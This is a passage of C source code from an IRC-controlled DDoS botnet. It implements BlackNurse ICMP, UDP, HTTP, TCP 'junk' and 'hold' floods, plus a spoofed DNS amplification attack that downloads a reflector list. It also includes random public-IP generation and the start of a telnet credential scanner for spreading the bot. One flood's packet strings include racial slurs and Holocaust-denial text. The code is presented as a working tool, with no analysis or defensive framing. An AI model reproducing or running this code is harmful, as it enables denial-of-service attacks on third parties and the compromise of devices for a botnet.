    return i.s_addr;
}

uint32_t Q[4096], c = 362436;

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1)&4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if(x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

void blacknurse(int sock, char *sender, int argc, char *argv[]) {
    uint8_t pkt_template[] = {
        0x03,
        0x03,
        0x0d,
        0x33,
        0x00,
        0x00,
        0x00,
        0x00,
        0x45,
        0x00,
        0x00,
        0x1c,
        0x4a,
        0x04,
        0x00,
        0x00,
        0x40,
        0x06,
        0x20,
        0xc5,
        0x01,
        0x02,
        0x03,
        0x04,
        0x05,
        0x06,
        0x07,
        0x08,
        0x00,
        0x00,
        0x00,
        0x00,
        0x00,
        0x08,
        0xef,
        0xc1
    };
    uint8_t * pkt;
    struct addrinfo * ai, hints;
    const char *host;
    struct pollfd pfd;
    const size_t pkt_len = (sizeof pkt_template) / (sizeof pkt_template[0]);
    size_t i;
    int gai_err;
    int kindy;
    int x, secs, get;

    if (mfork(sender) != 0) return;
    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);

    if (argc < 2) {
        Send(sock, "NOTICE %s :BLACKNURSE <target ip> <secs>\n", sender);
        exit(1);
    }

    host = argv[1];
    secs = atoi(argv[2]);

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    if ((gai_err = getaddrinfo(host, NULL,&hints,&ai)) != 0) {
        exit(1);
    }
    if ((kindy = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        perror("socket");
        exit(1);
    }
    Send(sock, "NOTICE %s :Blacknursing %s\n", sender, host);
    pkt = pkt_template;
    pfd.fd = kindy;
    pfd.events = POLLOUT;
    int end = time(NULL) + secs;
    for (;;) {
        for (i = 20; i < 20 + 8 + 4; i++) {
            pkt[i] = (uint8_t) rand();
        }
        if (sendto(kindy, pkt, pkt_len, 0,
                ai->ai_addr, ai->ai_addrlen) != (ssize_t) pkt_len) {
            if (errno == ENOBUFS) {
                poll(&pfd, 1, 1000);
                continue;
            }
            perror("sendto");
            break;
        }
        if (i >= 100) {
            if (time(NULL) > end) {
                exit(0);
            }
            x = 0;
        }
        x++;
    }
    /* NOTREACHED */
    close(kindy);
    freeaddrinfo(ai);

    return;
}

void makeRandomShit(unsigned char *buf, int length) {
    srand(time(NULL));
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (rand() % 255) + 1;
}

void unknown(int sock, char *sender, int argc, char ** argv) {
    /*
        Non spoof UDP flooder modded by Freak/SynthMesc
        Now has port and packetsize options
        and an option for random port and packetsize! (just enter 0)
        Each packet is unique!
        Cheers homies.
        only shout iz here and it is to:
        kod for all the help you gave me and showing me kaiten in the first place!
        luv u bb <3
    */
    int fd, i, packetsize, index;
    //    int flag = 1;
    int randport = 0;
    int randsize = 0;
    unsigned long secs;
    struct hostent * hp;
    struct sockaddr_in in ;
    time_t start = time(NULL);
    char *packsize;

    if (argc < 4) {
        Send(sock, "NOTICE %s :UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>\n", sender);
        exit(1);
    }

    if (mfork(sender) != 0) return;
    unsigned char *packet = malloc(65507);
    memset(packet, 0, 65507);

    if (!strcmp(argv[2], "0")) {
        randport = 1;
    }
    if (!strcmp(argv[3], "0")) {
        randsize = 1;
        packsize = "random";
    } else {
        packsize = argv[3];
    }

    srand(time(NULL));
    secs = atol(argv[4]);
    memset((void * )&in , 0, sizeof(struct sockaddr_in));

    in .sin_addr.s_addr = host2ip(sender, argv[1]); in .sin_family = AF_INET;
    if (randport == 0) { in .sin_port = htons(atoi(argv[2]));
        packsize = argv[3];
    }
    Send(sock, "NOTICE %s :Unknowning %s:%s with packet size %s\n", sender, argv[1], argv[2], packsize);
    while (1) {
        if (randport == 1) { in .sin_port = htons(realrand(1026, 65535));
        }

        if (randsize == 1) {
            makeRandomShit(packet, realrand(64, 1024));
        } else {
            makeRandomShit(packet, atoi(argv[3]));
        }

        if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0);
        else {
            sendto(fd, packet, strlen(packet), 0, (struct sockaddr * )&in , sizeof( in ));
            close(fd);
        }
        if (i >= 100) {
            if (time(NULL) >= start + secs) {
                break;
            } else {
                i = 0;
            }
        }
        i++;
    }
    close(fd);
    exit(0);
}

int listFork() {
    uint32_t parent, * newpids, i;
    parent = fork();
    if (parent <= 0) return parent;
    numpids++;
    newpids = (uint32_t * ) malloc((numpids + 1) * 4);
    for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;
    return parent;
}

void sendSTD(int sock, char *sender, int argc, char ** argv) {
    int fd, i, packetsize, index;
    //    int flag = 1;
    int randport,port = 0;
    unsigned long secs;
    struct hostent * hp;
    struct sockaddr_in in ;
    time_t start = time(NULL);
    char *strport;
    if (mfork(sender) != 0) return;
    if (argc < 3) {
        Send(sock, "NOTICE %s :UDP <target> <port, 0 for random> <secs>\n", sender);
        exit(1);
    }
    unsigned char *packet = malloc(1024);
    memset(packet, 0, 1024);
    if (!strcmp(argv[2], "0")) {
        randport = 1;
        strport = "random";
    } else {
        port = atoi(argv[2]);
        strport = argv[2];
    }

    srand(time(NULL));
    secs = atoi(argv[3]);
    memset((void * )&in , 0, sizeof(struct sockaddr_in));
        char * randstrings[] = {
        "std",
        "dts",
        "lsk",
        "kek",
        "smack",
        "ily",
        "tfw no gf",
        "frienzoned",
        "tyf",
        "pos",
        "cunts",
        "keksec",
        "keksec rox",
        "keksec ROX",
        "get raped",
        "not a ddos packet",
        "also not a ddos packet",
        "seriously not a ddos packet",
        "GET / HTTP/1.1\r\nHost: goatse.info\r\n\r\n",
        "GET / HTTP/1.1\r\nHost: tubgirl.ca\r\n\r\n",
        "GET / HTTP/1.0\r\nHost: goatse.info\r\n\r\n",
        "GET / HTTP/1.0\r\nHost: tubgirl.ca\r\n\r\n",
        "8======D~~~~~~~",
        "suck it",
        "give succ",
        "big nigger dick 8============================D",
        "( . Y . ) tiddies",
        "bigkek",
        "eye pee rape",
        "eye pee address rape",
        "IP rape",
        "eye pee address rape",
        "This is LOIC",
        "LOIC",
        "HOIC",
        "XOIC",
        "LHXOIC",
        "A cat is fine too. Desudesudesu~", // LOIC packets. KEKEK
        "the biiiiig pussy",
        "benis",
        "penis",
        "dick",
        "vagina",
        "clitoris",
        "pussy",
        "tfw",
        ":^}",
        "dic pic?",
        "send nudes",
        "https://youtu.be/dQw4w9WgXcQ",
        "Never gonna give you up",
        "Never gonna make you cry",
        "Never gonna let you die",
        "Never gonna hurt you",
        "bush did 9/11",
        "jet fuel can't melt steel beams",
        "9/11 was an inside job",
        "the illuminati is real",
        "wake up sheep",
        "i flex like david ike",
        "6 million jews? show me the proof!",
        "T R I G G E R E D",
        "free masons suck cock",
        "ihatejews",
        "urgay",
        "tfw u like dick",
        "dickbutt",
        "The elusive dickbut",
        "Heyyy that's pretty gooood",
        "NSA sucks cock",
        "FBI sucks cock",
        "You name it they suck cock"
        "What am I doing with my life",
        "Oh yeah I like nulling shit",
        "HIIYYOOOOOOO (Customgrow420)",
        "Keemstar is a fucking knome",
        "Leafy is gawd <3",
        "Ourmine is full of skids",
        "STC is the greatest"
    };
    in.sin_addr.s_addr = host2ip(sender, argv[1]); in .sin_family = AF_INET;
    Send(sock, "NOTICE %s :UDP attacking %s:%s\n", sender, argv[1], strport);
    while (1) {
        if (randport == 1) { in.sin_port = htons((rand() % 65535) + 1026); } else { in.sin_port = htons(port); }
        if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0);
        else {
            packet = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            sendto(fd, packet, strlen(packet), 0, (struct sockaddr * )&in , sizeof( in ));
            close(fd);
        }
        if (i >= 100) {
            if (time(NULL) >= start + secs) {
                break;
            } else {
                i = 0;
            }
        }
        i++;
    }
    close(fd);
    exit(0);
}

int getHost(unsigned char *toGet, struct in_addr * i) {
    struct hostent * h;
    if ((i->s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}

int socket_connect(char *host, unsigned short int port) {
    struct hostent * hp;
    struct sockaddr_in addr;
    int on = 1, sock;
    addr.sin_addr.s_addr = inet_addr(gethostbyname(host));
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr * )&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}

// HTTP Flood
void sendHTTP(char *method, char *host, int port, char *path, int timeFoo, int power) {
    const char *connections[] = {
        "close",
        "keep-alive",
        "accept"
    };
    int i, timeEnd = time(NULL) + timeFoo;
    char request[512];
    sprintf(request, "%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n\r\n", method, path, connections[(rand() % 3)], UserAgents[rand() % NUMITEMS(UserAgents)]);
    for (i = 0; i < power; i++) {
        if (fork()) {
            while (timeEnd > time(NULL)) {
                int sock = socket_connect((char *) host, port);
                if (sock != 0) {
                    write(sock, request, strlen(request));
                    close(sock);
                }
            }
            exit(1);
        }
    }
}

void HTTP(int sock, char *sender, int argc, char ** argv) {

    // !* HTTP METHOD TARGET PORT PATH TIME POWER
    // !* HTTP GET hackforums.net 80 / 10 100
    if (mfork(sender) != 0) return;
    if (argc < 6) {
        Send(sock, "NOTICE %s :HTTP <method> <target> <port> <path> <time> <power>\n", sender);
        exit(0);
    }
    Send(sock, "NOTICE %s :HTTP %s flooding %s with %d power\n", sender, argv[1], argv[2], atoi(argv[6]));
    sendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
    exit(0);
}

//   __             __          ___ _                 _
//   \ \  /\ /\  /\ \ \/\ /\   / __\ | ___   ___   __| |
//    \ \/ / \ \/  \/ / //_/  / _\ | |/ _ \ / _ \ / _` |
// /\_/ /\ \_/ / /\  / __ \  / /   | | (_) | (_) | (_| |
// \___/  \___/\_\ \/\/  \/  \/    |_|\___/ \___/ \__,_|

void sendJUNK(unsigned char *ip, int port, int end_time) {

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (getHost(ip,&dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t {
        int fd;
        uint8_t state;
    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    unsigned char *watwat = malloc(1024);
    memset(watwat, 0, 1024);
    int packetLen = 1024;

    int end = time(NULL) + end_time;
    while (end > time(NULL)) {
        for (i = 0; i < max; i++) {
            switch (fds[i].state) {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if (connect(fds[i].fd, (struct sockaddr * )&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd,&myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 1000;
                    res = select(fds[i].fd + 1, NULL,&myset, NULL,&tv);
                    if (res == 1) {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )(&valopt),&lon);
                        if (valopt) {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if (res == -1) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    //nonblocking sweg
                    packetLen = realrand(32, 1024);
                    makeRandomShit(watwat, packetLen);
                    if (send(fds[i].fd, watwat, packetLen, MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}

void junk(int sock, char *sender, int argc, char ** argv) {
    if (argc < 3 || atoi(argv[3]) < 0) {
        Send(sock, "NOTICE %s :JUNK <ip> <port> <time>\n", sender);
        return;
    }
    if (mfork(sender) != 0) return;
    Send(sock, "NOTICE %s :JUNK flooding %s:%s\n", sender, argv[1], argv[2]);
    sendJUNK(argv[1], atoi(argv[2]), atoi(argv[3]));
}

//              _     _     ___ _                 _
//   /\  /\___ | | __| |   / __\ | ___   ___   __| |
//  / /_/ / _ \| |/ _` |  / _\ | |/ _ \ / _ \ / _` |
// / __  / (_) | | (_| | / /   | | (_) | (_) | (_| |
// \/ /_/ \___/|_|\__,_| \/    |_|\___/ \___/ \__,_|

void sendHOLD(unsigned char *ip, int port, int end_time) {

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (getHost(ip,&dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t {
        int fd;
        uint8_t state;
    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    int end = time(NULL) + end_time;
    while (end > time(NULL)) {
        for (i = 0; i < max; i++) {
            switch (fds[i].state) {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if (connect(fds[i].fd, (struct sockaddr * )&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd,&myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd + 1, NULL,&myset, NULL,&tv);
                    if (res == 1) {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )(&valopt),&lon);
                        if (valopt) {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if (res == -1) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd,&myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd + 1, NULL, NULL,&myset,&tv);
                    if (res != 0) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}

void hold(int sock, char *sender, int argc, char ** argv) {
    if (argc < 3 || atoi(argv[3]) < 0) {
        Send(sock, "NOTICE %s :HOLD <ip> <port> <time>\n", sender);
        return;
    }
    if (mfork(sender) != 0) return;
    Send(sock, "NOTICE %s :HOLD flooding %s:%s\n", sender, argv[1], argv[2]);
    sendHOLD(argv[1], atoi(argv[2]), atoi(argv[3]));
}

struct list {
    char *resolver;
    struct list * next;
    struct list * prev;
};
struct list * head;
volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data {
    int thread_id;
    char *target;
    int dport;
    int limiter;
    int time;
};

typedef struct iphdr iph;
typedef struct udphdr udph;

// Pseudoheader struct
typedef struct {
    u_int32_t saddr;
    u_int32_t daddr;
    u_int8_t filler;
    u_int8_t protocol;
    u_int16_t len;
}
ps_hdr;

// DNS header struct
typedef struct {
    unsigned short id; // ID
    unsigned short flags; // DNS Flags
    unsigned short qcount; // Question Count
    unsigned short ans; // Answer Count
    unsigned short auth; // Authority RR
    unsigned short add; // Additional RR
}
dns_hdr;

// Question types
typedef struct {
    unsigned short qtype;
    unsigned short qclass;
}
query;

// Taken from http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
void dns_format(unsigned char *dns, unsigned char *host) {
    int lock = 0, i;
    strcat((char *) host, ".");
    for (i = 0; i < strlen((char *) host); i++) {
        if (host[i] == '.') {
            * dns++ = i - lock;
            for (; lock < i; lock++) {
                * dns++ = host[lock];
            }
            lock++;
        }
    }
    * dns++ = 0x00;
}

// Creates the dns header and packet
void dns_hdr_create(dns_hdr * dns) {
    dns->id = (unsigned short) htons(getpid());
    dns->flags = htons(0x0100);
    dns->qcount = htons(1);
    dns->ans = 0;
    dns->auth = 0;
    dns->add = 0;
}


void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, unsigned char *dns_record) {
    // Building the DNS request data packet

    unsigned char dns_data[128];

    dns_hdr * dns = (dns_hdr * )&dns_data;
    dns_hdr_create(dns);

    unsigned char *dns_name, dns_rcrd[32];
    dns_name = (unsigned char *)&dns_data[sizeof(dns_hdr)];
    strcpy(dns_rcrd, dns_record);
    dns_format(dns_name, dns_rcrd);

    query * q;
    q = (query * )&dns_data[sizeof(dns_hdr) + (strlen(dns_name) + 1)];
    q->qtype = htons(0x00ff);
    q->qclass = htons(0x1);

    // Building the IP and UDP headers
    char datagram[4096], * data, * psgram;
    memset(datagram, 0, 4096);

    data = datagram + sizeof(iph) + sizeof(udph);
    memcpy(data,&dns_data, sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query) + 1);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(dns_srv);

    iph * ip = (iph * ) datagram;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
    ip->id = htonl(rand_cmwc()&0xFFFFFFFF);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(trgt_ip);
    ip->daddr = sin.sin_addr.s_addr;
    ip->check = csum((unsigned short * ) datagram, ip->tot_len);

    udph * udp = (udph * )(datagram + sizeof(iph));
    udp->source = htons(trgt_p);
    udp->dest = htons(53);
    udp->len = htons(8 + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
    udp->check = 0;

    // Pseudoheader creation and checksum calculation
    ps_hdr pshdr;
    pshdr.saddr = inet_addr(trgt_ip);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));

    int pssize = sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
    psgram = malloc(pssize);

    memcpy(psgram, (char *)&pshdr, sizeof(ps_hdr));
    memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));

    udp->check = csum((unsigned short * ) psgram, pssize);

    // Send data
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd == -1) return;
    else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr * )&sin, sizeof(sin));

    free(psgram);
    close(sd);

    return;
}

void dnsflood(void * par1) {
    if (!listFork()) return;
    struct thread_data * td = (struct thread_data * ) par1;
    char *target = td->target;
    int dport = td->dport;
    int secs = td->time;
    char buffer[100];
    srand(time(NULL) ^ getpid());
    int i = 0;
    int end = time(NULL) + secs;
    while (1) {
        FILE * fp = fopen("DNS.txt", "r");
        while (fgets(buffer, 100, fp)) {
            if ((buffer[strlen(buffer) - 1] == '\n') || (buffer[strlen(buffer) - 1] == '\r')) {
                buffer[strlen(buffer) - 1] = 0x00;
            }
            dns_send(target, dport, buffer, "pixnet.net");
            pps++;
            if (i >= limiter) {
                i = 0;
                usleep(sleeptime);
            }
            i++;
            if (time(NULL) > end) {
                exit(0);
            }
        }
        fclose(fp);
    }
}

void dns(int sock, char *sender, int argc, char *argv[]) {
    if (mfork(sender) != 0) return;
    int get;
    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
    if (argc < 6) {
        Send(sock, "NOTICE %s :DNS <target IP> <port> <reflection file url> <forks> <pps limiter, -1 for no limit> <time>\n", sender);
        exit(0);
    }
    srand(time(NULL));
    int num_threads = atoi(argv[4]);
    int maxpps = atoi(argv[5]);
    int i, limiter = 0;
    download(argv[3], "DNS.txt");
    Send(sock, "NOTICE %s :DNS amplification flooding %s:%s for %d seconds at %d pps\n", sender, argv[1], argv[2], atoi(argv[6]), atoi(argv[5]));
    struct thread_data td[num_threads];
    for (i = 0; i < num_threads; i++) {
        td[i].thread_id = i;
        td[i].target = argv[1];
        td[i].dport = atoi(argv[2]);
        td[i].limiter = limiter;
        td[i].time = atoi(argv[6]);

        dnsflood((void * )&td[i]);
    }
    exit(0);
}
void printchar(unsigned char ** str, int c) {
    if (str) { **
        str = c;
        ++( * str);
    } else(void) write(1,&c, 1);
}
int prints(unsigned char ** out,
    const unsigned char *string, int width, int pad) {
    register int pc = 0, padchar = ' ';
    if (width > 0) {
        register int len = 0;
        register
        const unsigned char *ptr;
        for (ptr = string;* ptr; ++ptr) ++len;
        if (len >= width) width = 0;
        else width -= len;
        if (pad&PAD_ZERO) padchar = '0';
    }
    if (!(pad&PAD_RIGHT)) {
        for (; width > 0; --width) {
            printchar(out, padchar);
            ++pc;
        }
    }
    for (;* string; ++string) {
        printchar(out, * string);
        ++pc;
    }
    for (; width > 0; --width) {
        printchar(out, padchar);
        ++pc;
    }
    return pc;
}
int printi(unsigned char ** out, int i, int b, int sg, int width, int pad, int letbase) {
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;
    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints(out, print_buf, width, pad);
    }
    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    s = print_buf + PRINT_BUF_LEN - 1;
    * s = '\0';
    while (u) {
        t = u % b;
        if (t >= 10)
            t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }
    if (neg) {
        if (width && (pad&PAD_ZERO)) {
            printchar(out, '-');
            ++pc;
            --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints(out, s, width, pad);
}
int print(unsigned char ** out,
    const unsigned char *format, va_list args) {
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];
    for (;* format != 0; ++format) {
        if ( * format == '%') {
            ++format;
            width = pad = 0;
            if ( * format == '\0') break;
            if ( * format == '%') goto out;
            if ( * format == '-') {
                ++format;
                pad = PAD_RIGHT;
            }
            while ( * format == '0') {
                ++format;
                pad |= PAD_ZERO;
            }
            for (;* format >= '0' && * format <= '9'; ++format) {
                width *= 10;
                width += * format - '0';
            }
            if ( * format == 's') {
                register char *s = (char *) va_arg(args, int);
                pc += prints(out, s ? s : "(null)", width, pad);
                continue;
            }
            if ( * format == 'd') {
                pc += printi(out, va_arg(args, int), 10, 1, width, pad, 'a');
                continue;
            }
            if ( * format == 'x') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'a');
                continue;
            }
            if ( * format == 'X') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'A');
                continue;
            }
            if ( * format == 'u') {
                pc += printi(out, va_arg(args, int), 10, 0, width, pad, 'a');
                continue;
            }
            if ( * format == 'c') {
                scr[0] = (unsigned char) va_arg(args, int);
                scr[1] = '\0';
                pc += prints(out, scr, width, pad);
                continue;
            }
        } else {
            out: printchar(out, * format);
            ++pc;
        }
    }
    if (out) ** out = '\0';
    va_end(args);
    return pc;
}

int szprintf(unsigned char *out,
    const unsigned char *format, ...) {
    va_list args;
    va_start(args, format);
    return print(&out, format, args);
}

in_addr_t getDatIP() {
    uint8_t ipState[4] = {
        0
    };
    ipState[0] = rand() % 255;
    ipState[1] = rand() % 255;
    ipState[2] = rand() % 255;
    ipState[3] = rand() % 255;

    while (
        (ipState[0] == 0) ||
        (ipState[0] == 10) ||
        (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
        (ipState[0] == 127) ||
        (ipState[0] == 169 && ipState[1] == 254) ||
        (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
        (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
        (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
        (ipState[0] == 192 && ipState[1] == 168) ||
        (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
        (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
        (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
        (ipState[0] >= 224) && (ipState <= 239) //Multicast ip ranges
    ) {
        ipState[0] = rand() % 255;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
    }

    char ip[16] = {
        0
    };
    szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
    return inet_addr(ip);
}
int negotiate(int sock, unsigned char *buf, int len) {
    unsigned char c;
    switch (buf[1]) {
    case CMD_IAC:
        return 0;
    case CMD_WILL:
    case CMD_WONT:
    case CMD_DO:
    case CMD_DONT:
        c = CMD_IAC;
        send(sock,&c, 1, MSG_NOSIGNAL);
        if (CMD_WONT == buf[1]) c = CMD_DONT;
        else if (CMD_DONT == buf[1]) c = CMD_WONT;
        else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
        else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
        send(sock,&c, 1, MSG_NOSIGNAL);
        send(sock,&(buf[2]), 1, MSG_NOSIGNAL);
        break;
    default:
        break;
    }
 
    return 0;
}
 
int contains_string(char *buffer, char ** strings) {
    int num_strings = 0, i = 0;
    for (num_strings = 0; strings[++num_strings] != 0;);
    for (i = 0; i < num_strings; i++) {
        if (strcasestr(buffer, strings[i])) {
            return 1;
        }
    }
    return 0;
}
int contains_success(char *buffer) {
    return contains_string(buffer, successes);
}
int contains_fail(char *buffer) {
    return contains_string(buffer, fails);
}
int contains_response(char *buffer) {
    return contains_success(buffer) || contains_fail(buffer);
}
int read_with_timeout(int fd, int wait_usec, char *buffer, int buf_size) {
    fd_set read_set;
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = wait_usec;
    FD_ZERO(&read_set);
    FD_SET(fd,&read_set);
    if (select(fd + 1,&read_set, NULL, NULL,&tv) < 1)
        return 0;
    return recv(fd, buffer, buf_size, 0);
}
int read_until_response(int fd, int wait_usec, char *buffer, int buf_size, char ** strings) {
    int num_bytes, i;
    memset(buffer, 0, buf_size);
    num_bytes = read_with_timeout(fd, wait_usec, buffer, buf_size);
    if (&buffer[0] == "\xFF") {
        negotiate(fd, buffer, 3);
    }
 
    if (contains_string(buffer, strings)) {
        return 1;
    }
 
    return 0;
}
const char *get_telstate_host(struct telstate_t * telstate) { // get host
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = telstate->ip;
    return inet_ntoa(in_addr_ip);
}
void advance_telstate(struct telstate_t * telstate, int new_state) { // advance
    if (new_state == 0) {
        close(telstate->fd);
    }
    telstate->totalTimeout = 0;
    telstate->state = new_state;
    memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}
void reset_telstate(struct telstate_t * telstate) { // reset
    advance_telstate(telstate, 0);
    telstate->complete = 1;
}
int sclose(int fd) {
    if (3 > fd) return 1;
    close(fd);
    return 0;
}

int random_number(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

    result = (rand() % (hi_num - low_num)) + low_num;
    return result;
}

#ifdef DEBUG
#define SCANNER_MAX_CONNS   512
#define SCANNER_RAW_PPS     1024
#else
#define SCANNER_MAX_CONNS   512
#define SCANNER_RAW_PPS     1024
#endif

#define SCANNER_RDBUF_SIZE  256
#define SCANNER_HACK_DRAIN  64

struct scanner_auth {
    char *username;
    char *password;
    uint16_t weight_min, weight_max;
    uint8_t username_len, password_len;
};
typedef uint32_t ipv4_t;
struct scanner_connection {
    struct scanner_auth *auth;
    int fd, last_recv;
    enum {
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_PASSWD_RESP,
        SC_WAITING_ENABLE_RESP,
        SC_WAITING_SYSTEM_RESP,
        SC_WAITING_SHELL_RESP,
        SC_WAITING_SH_RESP,
        SC_WAITING_TOKEN_RESP
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[SCANNER_RDBUF_SIZE];
    uint8_t tries;
};

int scanner_pid, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
